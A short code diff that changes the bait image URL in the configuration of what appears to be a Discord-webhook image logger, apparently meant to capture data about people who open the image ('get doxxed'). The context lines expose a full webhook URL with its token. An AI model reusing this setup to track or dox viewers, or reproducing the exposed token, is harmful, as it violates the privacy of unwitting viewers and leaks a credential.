@@ -23,7 +23,7 @@ __author__ = "lynxWings"
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1143650377481322637/NU_7yN0qbh692omp2Wb7bwBb_viSm4kazYf5TADxjCn_nX-tRS-pcBkwxln2trfzQKOC", # <------------------------- Put your webhook link here.
-    "image": "https://www.google.com/imgres?imgurl=http%3A%2F%2Fidata.over-blog.com%2F4%2F32%2F32%2F44%2FEl-Caca--%2FInvasion-Extra-Terrestre-shit-poo-merde-crotte-caca-fiente-.jpg&tbnid=MNzjgY6yws2eIM&vet=12ahUKEwjmibT_lPGAAxX9BFkFHZqABCsQMygIegUIARCFAQ..i&imgrefurl=http%3A%2F%2Fonlyshit.over-blog.com%2Farticle-caca-n-8-xl-rampage-69648847.html&docid=lFa0jNB4tKZFBM&w=1038&h=1431&q=gros%20caca&ved=2ahUKEwjmibT_lPGAAxX9BFkFHZqABCsQMygIegUIARCFAQ", # <------------------------- Put image address link here.
+    "image": "https://www.google.com/imgres?imgurl=https%3A%2F%2Fmedia.tenor.com%2FE_caMlSWiEsAAAAC%2Fdoxxed-get-doxxed.gif&tbnid=BY6m-waSjRQp8M&vet=12ahUKEwjJnLP-x_OAAxXWpycCHRrGArkQMygJegQIARBH..i&imgrefurl=https%3A%2F%2Ftenor.com%2Fview%2Fdoxxed-get-doxxed-gif-21527937&docid=tl-MIZ1M-09dfM&w=498&h=498&q=GOT%20DOXED&ved=2ahUKEwjJnLP-x_OAAxXWpycCHRrGArkQMygJegQIARBH", # <------------------------- Put image address link here.
     "imageArgument": True,
 
     "username": "WingsMiner",
